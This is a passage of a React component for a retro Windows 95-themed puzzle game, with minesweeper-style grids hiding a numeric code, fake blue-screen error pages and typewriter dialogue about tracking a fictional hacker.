                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-33">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-34">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-35">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-36">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield flags" id="mf-37">
                                        <li className="num-8">2</li><li></li><li></li><li></li><li></li><li></li><li className="num-8">4</li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="num-8">8</li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="num-8">5</li><li></li><li></li><li></li><li></li><li></li><li className="num-8">0</li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-38">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-39">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-40">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-41">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-42">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-43">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-44">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-45">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-46">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-47">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-48">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-49">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-50">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-51">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-52">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-53">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-54">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-55">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-56">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-57">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-58">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-59">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-60">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-61">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-62">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-63">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-64">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li>
                                    </ul>
                                </div>
                            </form>
                        </Draggable>
                        <form id="poopup" role="dialog">
                            <div className="client">
                                <label htmlFor="open-poop" onClick={() => { setState({ ...state, poopup: !state.poopup, poopVisibility: !state.poopup, transmission: false }) }}>&#x1F4A9; Exit</label>
                            </div>
                        </form>
                        <article id="error" className="blue">
                            <a href="#another-error">
                                <h2><em>Windows</em></h2>
                                <header>
                                    A fatal exception 0E has occurred at 0123:CAFEBABE in VXD VMM(01) + 0000B00B. The current application will be terminated.
                                </header>
                                <ul>
                                    <li>Press any key to terminate the current application.</li>
                                    <li>Press CTRL+ALT+DEL again to restart your computer. You will lose any unsaved information in all applications.</li>
                                </ul>
                                <footer>
                                    Press any key to continue
                                    <span className="caret"></span>
                                </footer>
                            </a>
                        </article>
                        <article id="another-error" className="blue">
                            <a href="#dead">
                                <h2><em>Windows</em></h2>
                                <header>
                                    A fatal exception 0D has occurred at 0001:DEFEC8ED. The current application will be terminated.
                                </header>
                                <ul>
                                    <li>Press any key to terminate the current application.</li>
                                    <li>Press CTRL+ALT+DEL again to restart your computer. You will lose any unsaved information in all applications.</li>
                                </ul>
                                <footer>
                                    Press any key to continue
                                    <span className="caret"></span>
                                </footer>
                            </a>
                        </article>
                        <article id="dead"><a href="#restart"><i className="lg busy"></i></a></article>
                        <article id="black"></article>
                        <article id="restart">
                            <header className="starting">Starting Windows 95...</header>
                            <section className="startup">
                                <h2>Microsoft<em>Windows<sup>&reg;</sup><strong>95</strong></em></h2>
                                <h3>Microsoft<sup>&reg;</sup></h3>
                                <i className="clouds"></i>
                                <i className="logo"></i>
                                <footer className="bar"></footer>
                            </section>
                        </article>
                    </div>
                </div>

            </div>
            <div className="interactions">
                {
                    state.transmission &&
                    <TypeWriter contents={[`We got into the server, let’s take this thing down.`, 3000,
                    'What!? What is this operating system? Looks like ancient technology.', 3000,
                    `It seems that the hacker used this server to send some kind of message, follow the trail he left`,
                    3000]}
                    speed={100}
                    onDone={() => { }} />
                }
                {
                    !state.transmission && !state.m37 &&
                    <TypeWriter contents={[`Great work you disable the transmission now we need to know what he's up to `, 3000,
                    'That Minesweeper it seems that he wants to tell me something.']}
                    speed={100}
                    onDone={() => { }} />
                }{
                    state.m37 &&
                    <TypeWriter contents={[`That code! where should i use it?`]}
                    speed={100}
                    onDone={() => { }} />
                }
                
            </div>
        </>
    )
}

export default Windows
